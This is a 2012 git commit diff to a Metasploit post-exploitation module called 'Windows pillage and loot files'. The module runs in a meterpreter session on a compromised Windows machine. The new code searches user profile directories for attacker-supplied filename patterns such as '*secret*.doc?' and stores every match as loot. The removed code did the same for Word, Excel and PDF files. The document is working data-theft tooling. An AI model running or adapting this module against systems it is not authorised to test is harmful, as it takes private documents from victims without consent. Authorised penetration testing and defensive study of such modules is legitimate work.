8167f7a62382a8bef19fca7009afbeab385e16e8
3vi1john <jbabio@me.com>
2012-06-18 15:59:57 -0300

    Update unstable

--- unstable-modules/post/gather_files.rb
+++ unstable-modules/post/gather_files.rb
@@ -3,28 +3,24 @@ require 'msf/core/post/file'
 class Metasploit3 < Msf::Post
 
 	include Msf::Post::File
-
+	include Msf::Auxiliary::Report
+	
 	def initialize(info={})
 		super( update_info( info,
-			'Name'          => 'Windows Gather Docs',
-			'Description'   => %q{ This module gathers specific files from user directories. },
-			'License'       => BSD_LICENSE,
-			'Author'        => [ '3vi1john Jbabio@me.com'],
-			'Version'       => '$Revision: 20 $',
+			'Name'          => 'Windows pillage and loot files',
+			'Description'   => %q{ This module gathers files based on pattern match and stores the information/file in loot. },
+			'License'       => MSF_LICENSE,
+			'Author'        => [ '3vi1john <Jbabio[at]me.com>', 'RageLtMan <rageltman[at]sempervictus>'],
+			'Version'       => '$Revision: 30 $',
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 
 		register_options(
 			[
-				OptBool.new(  'GETDOC',   [ false, 'Search and download all .doc files.', false]),
-				OptBool.new(  'GETDOCX',   [ false, 'Search and download all .docx files.', false]),
-				OptBool.new(  'GETXLS',   [ false, 'Search and download all .xls files.', false]),
-				OptBool.new(  'GETXLSX',   [ false, 'Search and download all .xlsx files.', false]),
-				OptBool.new(  'GETPDF',   [ false, 'Search and download all .pdf files.', false]),
 				OptBool.new(  'GETDRIVES', [ false, 'Search for a list of drives and display drive letters.', false]),
 				OptString.new(  'SEARCH_FROM', [ false, 'Search from a specified location. Ex. C:\\, Run GETDRIVES first.']),
-				OptString.new(  'FILE_TYPE', [ false, 'Search for a specific file type based on extension. Ex *.gnmap, *.nbe'])
+				OptString.new(  'FILE_GLOBS', [ false, 'The file pattern globs to search for, comma separated. (e.g. *secret*.doc?,*.pdf)'])
 			], self.class)
 	end
 
@@ -44,112 +40,34 @@ class Metasploit3 < Msf::Post
 			print_status("Drives Available = #{drives.inspect}")
 	end
 
-	def download_doc_files
-		location = datastore['SEARCH_FROM']
-		file_type = "*.doc"
-		dest = "/tmp"
-		sysnfo = client.sys.config.sysinfo['OS']
-		if datastore['SEARCH_FROM']
-			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
-		elsif sysnfo =~/Windows XP|2003|.NET/
-			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
-		else sysnfo =~/Windows 7|Windows Vista|2008/
-			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
+	def download_files(file_type=nil) 
+		if file_type.nil?
+			print_error("Nothing to search for")
+			return
 		end
-		getfile.each do |file|
-			print_status("Downloading #{file['path']}\\#{file['name']}")
-			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
-			end
-	end
-
-	def download_docx_files
 		location = datastore['SEARCH_FROM']
-		file_type = "*.docx"
-		dest = "/tmp"
-		sysnfo = client.sys.config.sysinfo['OS']
-		if datastore['SEARCH_FROM']
+		sysdriv = client.fs.file.expand_path("%SYSTEMDRIVE%")
+		sysnfo = client.sys.config.sysinfo['OS']	
+		profile_path_old = sysdriv + "\\Documents and Settings\\"		
+ 		profile_path_new = sysdriv + "\\Users\\"
+		if location
+			print_status("Searching #{location}")			
 			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
-		elsif sysnfo =~/Windows XP|2003|.NET/
-			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
-		else sysnfo =~/Windows 7|Windows Vista|2008/
-			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
-		end
+		elsif sysnfo =~/(Windows XP|2003|.NET)/
+			print_status("Searching #{profile_path_old} through windows user profile structure")      			
+			getfile = client.fs.file.search(profile_path_old,file_type,recurse=true,timeout=-1)
+    		else sysnfo =~/(Windows 7|Windows Vista|2008)/
+			print_status("Searching #{profile_path_new} through windows user profile structure")      			
+			getfile = client.fs.file.search(profile_path_new,file_type,recurse=true,timeout=-1)
+		end		
 		getfile.each do |file|
+			ctype = ""
+			filename = "#{file['path']}\\#{file['name']}"		
+			data = read_file(filename)
 			print_status("Downloading #{file['path']}\\#{file['name']}")
-			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
+			store_loot("files.found", ctype, session, data, filename, "Downloaded Files")
 			end
-	end
-
-	def download_xls_files
-		location = datastore['SEARCH_FROM']
-		file_type = "*.xls"
-		dest = "/tmp"
-		sysnfo = client.sys.config.sysinfo['OS']
-		if datastore['SEARCH_FROM']
-			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
-		elsif sysnfo =~/Windows XP|2003|.NET/
-			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
-		else sysnfo =~/Windows 7|Windows Vista|2008/
-			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
-		end
-		getfile.each do |file|
-			print_status("Downloading #{file['path']}\\#{file['name']}")
-			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
-			end
-	end
-
-	def download_xlsx_files
-		location = datastore['SEARCH_FROM']
-		file_type = "*.xlsx"
-		dest = "/tmp"
-		sysnfo = client.sys.config.sysinfo['OS']
-		if datastore['SEARCH_FROM']
-			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
-		elsif sysnfo =~/Windows XP|2003|.NET/
-			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
-		else sysnfo =~/Windows 7|Windows Vista|2008/
-			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
-		end
-		getfile.each do |file|
-			print_status("Downloading #{file['path']}\\#{file['name']}")
-			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
-			end
-	end
-
-	def download_pdf_files
-		location = datastore['SEARCH_FROM']
-		file_type = "*.pdf"
-		dest = "/tmp"
-		sysnfo = client.sys.config.sysinfo['OS']
-		if datastore['SEARCH_FROM']
-			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
-		elsif sysnfo =~/Windows XP|2003|.NET/
-			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
-		else sysnfo =~/Windows 7|Windows Vista|2008/
-			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
-		end
-		getfile.each do |file|
-			print_status("Downloading #{file['path']}\\#{file['name']}")
-			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
-			end
-	end
-
-	def download_ud_files
-		location = datastore['SEARCH_FROM']
-		file_type = datastore['FILE_TYPE']
-		dest = "/tmp"
-		sysnfo = client.sys.config.sysinfo['OS']
-		if datastore['SEARCH_FROM']
-			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
-		elsif sysnfo =~/Windows XP|2003|.NET/
-			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
-		else sysnfo =~/Windows 7|Windows Vista|2008/
-			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
-		end
-		getfile.each do |file|
-			print_status("Downloading #{file['path']}\\#{file['name']}")
-			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
-			end
+		
 	end
 
 	def run
@@ -157,37 +75,18 @@ class Metasploit3 < Msf::Post
 			if datastore['GETDRIVES']
 				get_drives
 			end
-			if datastore['GETDOC']
-				print_status("\tSearching for and downloading Office Word documents...")
-				print_status("")
-				download_doc_files
-			end
-			if datastore['GETDOCX']
-				print_status("\tSearching for and downloading Office 2007+ Word documents...")
-				print_status("")
-				download_docx_files
-			end
-			if datastore['GETXLS']
-				print_status("\tSearching for and downloading Office Excel spreadsheets...")
-				print_status("")
-				download_xls_files
-			end
-			if datastore['GETXLSX']
-				print_status("\tSearching for and downloading Office 2007+ Excel spreadsheets...")
-				print_status("")
-				download_xlsx_files
-			end
-			if datastore['GETPDF']
-				print_status("\tSearching for and downloading Adobe pdf files...")
-				print_status("")
-				download_pdf_files
-			end
-			if datastore['FILE_TYPE']
-				download_ud_files
+			if datastore['FILE_GLOBS'] == nil
+				print_status("You must enter a pattern or file type to search for...")
+			else			
+				datastore['FILE_GLOBS'].split(",").each do |glob|
+				download_files(glob)
+			end			
+			
 			end
 			print_status("Done!")
 		end
-		rescue::Exception => e
-			print_status("The following Error was encountered: #{e.class} #{e}")
+		rescue::Rex::Post::Meterpreter::RequestError => e
+		
 		end
-	end
+	
+end
